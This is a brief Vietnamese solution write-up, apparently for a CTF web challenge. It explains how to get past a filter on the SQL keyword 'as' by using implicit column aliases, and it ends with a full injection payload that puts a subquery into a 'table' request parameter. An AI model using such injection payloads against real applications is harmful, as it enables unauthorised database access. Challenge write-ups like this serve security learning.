# Solution

Bài này chủ yếu dùng alias để giải mặc dù vì bị filter `as` nhưng ta có thể `select blabla <alias name>`

Sẽ trả về

|`alias name` |
| ----------- |
| blabla      |
| ....        |
| blabla      |


Final payload

```
user_id=8&table=(select 8 id, enemy username from costume where id like 1)&submit=Submit
```